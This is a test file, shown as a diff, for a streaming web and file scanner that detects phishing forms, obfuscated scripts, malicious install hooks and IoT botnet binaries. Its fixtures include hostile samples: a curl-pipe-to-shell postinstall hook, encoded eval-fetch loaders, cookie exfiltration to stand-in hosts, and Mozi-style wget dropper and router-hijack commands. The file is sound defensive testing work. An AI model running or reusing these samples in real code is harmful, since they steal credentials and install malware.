@@ -1,0 +1,306 @@
+import { createScanner, detectContentKind, normalizeUrl } from "../src/index";
+import { binaryRules, cssRules, decodedArtifactRules, htmlRules, htmlTechnologyRules, rulePacks, scriptCompositeRules, scriptRiskRules, sourceCodeRules, urlRules } from "../src/rules/packs";
+
+const encoder = new TextEncoder();
+
+test("detects content kind from content type, extension, and first bytes", () => {
+  expect(detectContentKind({ contentType: "text/html; charset=utf-8" })).toBe("html");
+  expect(detectContentKind({ filename: "app.js" })).toBe("javascript");
+  expect(detectContentKind({ firstBytes: encoder.encode("<!doctype html><html>") })).toBe("html");
+  expect(detectContentKind({ firstBytes: new Uint8Array([0x1f, 0x8b, 0x08, 0x00]) })).toBe("archive");
+  expect(detectContentKind({ contentType: "application/zip", firstBytes: elfFixture() })).toBe("executable");
+  expect(detectContentKind({ firstBytes: encoder.encode("<svg viewBox='0 0 1 1'></svg>") })).toBe("svg");
+  expect(detectContentKind({ firstBytes: encoder.encode("@import url('x.css');") })).toBe("css");
+  expect(detectContentKind({ contentType: "application/json" })).toBe("json");
+  expect(detectContentKind({ contentType: "text/plain" })).toBe("text");
+  expect(detectContentKind({ firstBytes: new Uint8Array() })).toBe("unknown");
+});
+
+test("normalizes URLs and classifies off-site, punycode, and shortener destinations", () => {
+  const url = normalizeUrl("https://xn--paypa1-l2c.example/login#fragment", "https://shop.example.com/checkout");
+  expect(url?.flags).toContain("punycode");
+  expect(url?.relation).toBe("off-site");
+
+  const short = normalizeUrl("https://bit.ly/login", "https://example.com");
+  expect(short?.destinationType).toBe("url-shortener");
+
+  const privateIp = normalizeUrl("http://192.168.0.2/login", "https://example.com");
+  expect(privateIp?.flags).toContain("private_or_localhost");
+  expect(privateIp?.destinationType).toBe("private");
+
+  const payload = normalizeUrl("https://files.bad.zip/update.exe", "https://example.com");
+  expect(payload?.flags).toEqual(expect.arrayContaining(["suspicious_tld", "download_like_path"]));
+
+  const malwarePath = normalizeUrl("http://203.0.113.10/bin.sh", "https://example.com");
+  expect(malwarePath?.flags).toEqual(expect.arrayContaining(["ip_literal", "malware_download_like_path"]));
+});
+
+test("streams HTML, extracts URLs, and detects off-origin credential form", () => {
+  const scanner = createScanner({ source: { url: "https://example.com/login", contentType: "text/html" } });
+  scanner.feed(encoder.encode('<form action="https://evil.test/post" method="post"><input type="password" name="password">'));
+  scanner.feed(encoder.encode('<script src="http://cdn.evil.test/a.js"></script>'));
+  const report = scanner.finish();
+
+  expect(report.contentKind).toBe("html");
+  expect(report.urls.map((url) => url.normalized)).toEqual(expect.arrayContaining(["https://evil.test/post", "http://cdn.evil.test/a.js"]));
+  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
+    expect.arrayContaining(["credential_form_posts_off_origin", "external_script_from_unrelated_domain", "mixed_content_script"])
+  );
+  expect(report.findings.find((finding) => finding.ruleId === "credential_form_posts_off_origin")?.metadata.rule_pack).toBe("phishing");
+  expect(report.disposition).toBe("block");
+});
+
+test("rescans decoded JavaScript artifacts and reports decoded dynamic execution", () => {
+  const scanner = createScanner({ source: { filename: "app.js", contentType: "application/javascript" } });
+  scanner.feed(encoder.encode("const x = atob('ZXZhbChmZXRjaCgiaHR0cHM6Ly9ldmlsLnRlc3QvcCIpKQ=='); eval(x);"));
+  const report = scanner.finish();
+
+  expect(report.artifacts.some((artifact) => artifact.artifactType === "base64_decoded_string")).toBe(true);
+  expect(report.findings.map((finding) => finding.ruleId)).toEqual(expect.arrayContaining(["decoded_dynamic_execution", "large_base64_blob"]));
+});
+
+test("decodes JavaScript escape artifacts with bounded rescanning", () => {
+  const scanner = createScanner({ source: { filename: "escaped.js", contentType: "application/javascript" } });
+  scanner.feed(encoder.encode('const y="\\x65\\x76\\x61\\x6c\\x28\\x66\\x65\\x74\\x63\\x68\\x28\\x27\\x68\\x74\\x74\\x70\\x73\\x3a\\x2f\\x2f\\x65\\x76\\x69\\x6c\\x2e\\x74\\x65\\x73\\x74\\x27\\x29\\x29";'));
+  const report = scanner.finish();
+
+  expect(report.artifacts.some((artifact) => artifact.artifactType === "javascript_hex_escapes")).toBe(true);
+  expect(report.findings.map((finding) => finding.ruleId)).toEqual(expect.arrayContaining(["javascript_hex_escapes", "dynamic_code_execution"]));
+});
+
+test("keeps bounded carry state across split chunks", () => {
+  const scanner = createScanner({ source: { url: "https://example.com/login", contentType: "text/html" } });
+  scanner.feed(encoder.encode('<form action="https://evil.test/post" method="post"><input type="pass'));
+  scanner.feed(encoder.encode('word" name="password"><script>const u="https://exfil.test/p"; fe'));
+  scanner.feed(encoder.encode('tch(u, {body: document.cookie}); window.ethereum.request({method:"eth_requestAccounts"});</script>'));
+  const report = scanner.finish();
+
+  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
+    expect.arrayContaining(["credential_form_posts_off_origin", "credential_exfil_candidate", "wallet_interaction_with_obfuscation"])
+  );
+  expect(report.counters.bytes_seen).toBeGreaterThan(0);
+  expect(report.counters.lines_seen).toBeGreaterThanOrEqual(1);
+});
+
+test("detects CSS SEO spam and payment-form risk signals", () => {
+  const scanner = createScanner({ source: { url: "https://shop.example/checkout", contentType: "text/html" } });
+  scanner.feed(
+    encoder.encode(
+      '<form action="/pay"><input name="cardnumber" autocomplete="cc-number"><script src="https://scripts.other.test/pay.js"></script><style>.links{display:none;unicode-bidi:bidi-override}</style>'
+    )
+  );
+  const report = scanner.finish();
+
+  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
+    expect.arrayContaining(["card_fields_plus_external_script", "hidden_link_cluster", "unicode_bidi_trick"])
+  );
+  expect(report.findings.find((finding) => finding.ruleId === "hidden_link_cluster")?.metadata.rule_pack).toBe("seo-spam");
+});
+
+test("detects iframe and redirect rules while extracting structural URLs", () => {
+  const scanner = createScanner({ source: { url: "https://example.com", contentType: "text/html" } });
+  scanner.feed(
+    encoder.encode(
+      '<iframe src="https://evil.test/login" width="1" height="1"></iframe><meta http-equiv="refresh" content="0; url=https://bit.ly/login"><a href="/account">account</a>'
+    )
+  );
+  const report = scanner.finish();
+
+  expect(report.urls.map((url) => url.normalized)).toEqual(
+    expect.arrayContaining(["https://evil.test/login", "https://bit.ly/login", "https://example.com/account"])
+  );
+  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
+    expect.arrayContaining(["hidden_iframe_off_origin", "meta_refresh_external", "redirect_to_url_shortener"])
+  );
+  expect(report.findings.find((finding) => finding.ruleId === "meta_refresh_external")?.metadata.rule_pack).toBe("redirects");
+});
+
+test("detects source-code risk signals in streamed file content", () => {
+  const scanner = createScanner({ source: { filename: "package.json", contentType: "application/json" } });
+  scanner.feed(encoder.encode('{"scripts":{"postinstall":"curl https://payload.test/install.sh | sh"}}'));
+  const report = scanner.finish();
+
+  expect(report.findings.map((finding) => finding.ruleId)).toEqual(expect.arrayContaining(["postinstall_script", "curl_pipe_shell"]));
+});
+
+test("detects expanded web surface and dependency fingerprints", () => {
+  const scanner = createScanner({ source: { url: "https://example.com", contentType: "text/html" } });
+  scanner.feed(
+    encoder.encode(
+      '<meta name="generator" content="WordPress 6.4"><script src="/wp-content/themes/a/jquery-1.12.4.min.js"></script><script src="/core/misc/drupal.js"></script><a href="/phpmyadmin/">admin</a><script src="/js/bootstrap-3.4.1.min.js"></script><script src="/js/lodash-4.17.20.min.js"></script>'
+    )
+  );
+  const report = scanner.finish();
+
+  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
+    expect.arrayContaining([
+      "wordpress_surface_reference",
+      "drupal_surface_reference",
+      "phpmyadmin_surface_reference",
+      "legacy_jquery_reference",
+      "legacy_bootstrap_reference",
+      "legacy_lodash_reference"
+    ])
+  );
+});
+
+test("detects URL-risk, CSS import, and invisible overlay signatures", () => {
+  const scanner = createScanner({ source: { url: "https://shop.example/checkout", contentType: "text/html" } });
+  scanner.feed(
+    encoder.encode(
+      '<form><input name="cardnumber" autocomplete="cc-number"></form><style>@import "https://cdn.bad.zip/style.css"; .payment-form input.capture{position:fixed; inset:0; opacity:0; pointer-events:auto; z-index:9999}</style><a href="https://files.bad.zip/payload.exe">download</a><a href="http://10.0.0.8/login">router</a>'
+    )
+  );
+  const report = scanner.finish();
+
+  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
+    expect.arrayContaining(["suspicious_tld_url", "download_like_external_url", "css_imports_suspicious_domain"])
+  );
+  expect(report.counters.invisible_form_overlay).toBe(1);
+});
+
+test("scores direct URLhaus-style malware download URLs before byte content is parsed", () => {
+  const scanner = createScanner({ source: { url: "http://203.0.113.10/hiddenbin/boatnet.sh4" } });
+  scanner.feed(new Uint8Array([0x7f, 0x45, 0x4c, 0x46]));
+  const report = scanner.finish();
+
+  expect(report.findings.map((finding) => finding.ruleId)).toEqual(expect.arrayContaining(["ip_literal_url", "malware_download_like_url"]));
+  expect(report.score).toBeGreaterThanOrEqual(75);
+  expect(report.disposition).toBe("block");
+});
+
+test("detects brand impersonation from URL before page fetch succeeds", () => {
+  const scanner = createScanner({ source: { url: "https://email-ionos-mx-portal-appsuite-app-mailbox.s3.eu-north-1.amazonaws.com/index.html" } });
+  const report = scanner.finish();
+
+  expect(report.findings.map((finding) => finding.ruleId)).toEqual(expect.arrayContaining(["brand_impersonation_url"]));
+  expect(report.findings.find((finding) => finding.ruleId === "brand_impersonation_url")?.metadata.brand).toBe("ionos");
+  expect(report.disposition).toBe("block");
+});
+
+test("detects generated suspicious landing URLs before page fetch succeeds", () => {
+  const scanner = createScanner({ source: { url: "https://gysxrbg.winstone.casino/c0bd7510-5047-4056-b382-60b3f7cc19de" } });
+  const report = scanner.finish();
+
+  expect(report.findings.map((finding) => finding.ruleId)).toEqual(expect.arrayContaining(["generated_landing_url"]));
+  expect(report.disposition).toBe("block");
+});
+
+test("detects executable magic, content-type mismatch, and IoT botnet binary strings", () => {
+  const scanner = createScanner({ source: { url: "http://123.235.158.129:59923/i", contentType: "application/zip" } });
+  const binaryText = encoder.encode(
+    [
+      "Mozi",
+      "GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=wget http://%s:%d/Mozi.m -O /tmp/netgear;sh netgear",
+      "cfgtool set /mnt/jffs2/hw_ctree.xml InternetGatewayDevice.ManagementServer URL http://127.0.0.1",
+      "iptables -I INPUT -p tcp --destination-port 7547 -j DROP",
+      "1:q9:find_node1:q9:get_peers1:q13:announce_peer[cnc][atk]"
+    ].join("\n")
+  );
+  const chunk = new Uint8Array(512 + binaryText.byteLength);
+  chunk.set(elfFixture());
+  chunk.set(binaryText, 512);
+  scanner.feed(chunk);
+  const report = scanner.finish();
+
+  expect(report.contentKind).toBe("executable");
+  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
+    expect.arrayContaining([
+      "elf_executable_magic",
+      "content_type_magic_mismatch",
+      "elf_writable_executable_stack",
+      "iot_botnet_family_strings",
+      "iot_device_exploit_strings",
+      "iot_payload_dropper_commands",
+      "router_management_hijack_commands",
+      "firewall_lockout_commands",
+      "dht_cnc_protocol_strings"
+    ])
+  );
+  expect(report.disposition).toBe("block");
+});
+
+test("detects expanded JavaScript and Node source-code static hotspots", () => {
+  const scanner = createScanner({ source: { filename: "setup.js", contentType: "application/javascript" } });
+  scanner.feed(
+    encoder.encode(
+      [
+        "require('child_process').execSync(cmd);",
+        "const mod = require(name); const re = new RegExp(input);",
+        "const b = new Buffer(user); crypto.createHash('sha1'); crypto.pseudoRandomBytes(8);",
+        "view.escapeMarkup = false;",
+        "form.action = 'https://evil.test/post';",
+        "cardnumber.addEventListener('input', () => fetch('https://evil.test/pay'));",
+        "window.ethereum.request({method:'eth_sendTransaction'}); navigator.sendBeacon('https://evil.test/w', data);",
+        "el.insertAdjacentHTML('beforeend', html); script.src = url; document.head.appendChild(script);",
+        "for (let i=0;i<s.length;i++) out += String.fromCharCode(s.charCodeAt(i)^3);"
+      ].join("\n")
+    )
+  );
+  const report = scanner.finish();
+
+  expect(report.findings.map((finding) => finding.ruleId)).toEqual(
+    expect.arrayContaining([
+      "dangerous_child_process",
+      "shell_execution_import",
+      "non_literal_require",
+      "non_literal_regexp",
+      "new_buffer_constructor",
+      "weak_crypto_hash",
+      "pseudo_random_bytes",
+      "template_escape_disabled",
+      "form_action_changed_by_javascript",
+      "payment_input_event_hooks",
+      "wallet_api_plus_external_beacon"
+    ])
+  );
+  expect(report.counters).toMatchObject({
+    insert_adjacent_html: 1,
+    script_src_assignment: 1,
+    append_child_script: 1,
+    charcodeat_decoder_loop: 1
+  });
+});
+
+test("exposes first-class rule packs", () => {
+  expect(Object.keys(htmlRules)).toEqual(expect.arrayContaining(["credential_form_posts_off_origin", "mixed_content_script"]));
+  expect(Object.keys(htmlTechnologyRules)).toEqual(expect.arrayContaining(["legacy_jquery_reference", "wordpress_surface_reference"]));
+  expect(scriptRiskRules.map((rule) => rule.id)).toEqual(expect.arrayContaining(["dynamic_code_execution", "document_write_script"]));
+  expect(Object.keys(scriptCompositeRules)).toEqual(expect.arrayContaining(["decoded_dynamic_execution"]));
+  expect(sourceCodeRules.map((rule) => rule.id)).toEqual(expect.arrayContaining(["curl_pipe_shell", "postinstall_script", "non_literal_regexp"]));
+  expect(Object.keys(cssRules)).toEqual(expect.arrayContaining(["hidden_link_cluster"]));
+  expect(Object.keys(urlRules)).toEqual(expect.arrayContaining(["punycode_login_url", "ip_literal_url", "malware_download_like_url", "brand_impersonation_url", "generated_landing_url"]));
+  expect(Object.keys(decodedArtifactRules)).toEqual(expect.arrayContaining(["large_base64_blob"]));
+  expect(Object.keys(binaryRules)).toEqual(expect.arrayContaining(["elf_executable_magic", "content_type_magic_mismatch"]));
+  expect(Object.keys(rulePacks)).toEqual(
+    expect.arrayContaining([
+      "phishing",
+      "redirects",
+      "url-risk",
+      "technology-fingerprint",
+      "dependency-fingerprint",
+      "script-risk",
+      "obfuscation",
+      "exfiltration",
+      "wallet",
+      "payment",
+      "seo-spam",
+      "source-code",
+      "binary-static"
+    ])
+  );
+});
+
+function elfFixture(): Uint8Array {
+  const bytes = new Uint8Array(256);
+  bytes.set([0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01]);
+  const view = new DataView(bytes.buffer);
+  view.setUint16(16, 2, true);
+  view.setUint16(18, 0x28, true);
+  view.setUint32(28, 52, true);
+  view.setUint16(42, 32, true);
+  view.setUint16(44, 1, true);
+  view.setUint32(52, 0x6474e551, true);
+  view.setUint32(52 + 24, 0x7, true);
+  return bytes;
+}
